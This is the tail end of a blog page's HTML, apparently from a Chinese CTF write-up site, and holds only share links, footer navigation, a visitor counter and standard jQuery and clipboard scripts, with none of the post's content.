  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&name=web入门命令执行篇-ctfshow&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/03/17/web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87-ctfshow/&t=web入门命令执行篇-ctfshow"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        
<footer id="footer">
    <div class="footer-left">
        Copyright ©
        
        
        2024-2025
        wanTh3flag
        <br>
    </div>
    
    <div class="footer-right">
        <nav>
            <ul>
                <!--
                --><li><a href="/">H0me</a></li><!--
                --><!--
                --><li><a href="/about/">A6out</a></li><!--
                --><!--
                --><li><a href="/tags/">T6gs</a></li><!--
                --><!--
                --><li><a href="/categories/">Catagory</a></li><!--
                --><!--
                --><li><a href="/links/">L1nks</a></li><!--
                --><!--
                --><li><a href="/search/">s4arch</a></li><!--
                -->
            </ul>
            <ul>
                
                <!-- 不蒜子统计 -->
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>
        </nav>
    </div>
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
